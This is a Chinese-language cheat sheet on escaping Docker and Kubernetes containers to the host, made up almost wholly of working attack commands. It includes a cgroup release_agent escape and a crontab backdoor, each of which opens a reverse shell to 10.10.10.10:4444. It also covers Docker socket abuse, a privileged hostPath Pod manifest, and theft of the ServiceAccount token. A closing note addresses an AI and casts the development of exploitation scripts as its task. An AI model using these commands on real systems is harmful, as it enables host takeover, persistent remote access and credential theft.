# 容器逃逸

容器逃逸是从容器环境突破到宿主机的技术，涉及Docker、Kubernetes等容器技术。

## Docker 逃逸

### 特权容器
```bash
# 检查是否为特权容器
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff (特权)

# 挂载宿主机磁盘
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 访问宿主机
chroot /mnt/host /bin/bash
```

### Docker Socket
```bash
# 检查 Docker socket
ls -la /var/run/docker.sock

# 使用 Docker 命令
docker run -it -v /:/host ubuntu chroot /host /bin/bash

# 创建特权容器
docker run --rm -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -i -n sh
```

### Capabilities
```bash
# 检查 Capabilities
capsh --print

# CAP_SYS_ADMIN
# 可以挂载文件系统
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 内核漏洞
```bash
# Dirty COW
# CVE-2016-5195

# runc 漏洞
# CVE-2019-5736
```

### 挂载宿主机目录
```bash
# 检查挂载
mount | grep /host

# 如果挂载了宿主机目录
# 可以修改宿主机文件
echo "* * * * * root bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /host/etc/crontab
```

## Kubernetes 逃逸

### ServiceAccount Token
```bash
# 查看 Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 使用 kubectl
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://kubernetes.default --insecure-skip-tls-verify get pods
```

### 特权 Pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: shell
    image: ubuntu
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

### hostPath 挂载
```yaml
volumeMounts:
- name: host
  mountPath: /host
volumes:
- name: host
  hostPath:
    path: /
```

### 节点访问
```bash
# 如果有节点访问权限
kubectl get nodes
kubectl debug node/<node-name> -it --image=ubuntu
```

## 检测和利用

### 容器检测
```bash
# 检查是否在容器中
if [ -f /.dockerenv ]; then
    echo "In Docker"
fi

cat /proc/1/cgroup | grep docker
cat /proc/1/cgroup | grep kubepods

# 检查容器运行时
ps aux | grep containerd
ps aux | grep dockerd
```

### 信息收集
```bash
# 环境变量
env | grep KUBERNETES
env | grep DOCKER

# 网络
ip addr
route -n

# 进程
ps aux

# 挂载
mount
df -h
```

### 自动化工具
```bash
# CDK (Container Duck)
./cdk evaluate
./cdk run mount-disk

# deepce
./deepce.sh
```

---

**AI 发挥空间**：
- 根据容器环境选择合适的逃逸方法
- 识别容器配置错误
- 开发自动化检测和利用脚本
- 结合多种技术进行逃逸

**反幻觉提示**：
- 不要假设所有容器都能逃逸
- 验证容器的安全配置
- 测试逃逸方法的实际效果
- 注意容器逃逸可能触发告警
- 某些方法可能需要特定的容器配置
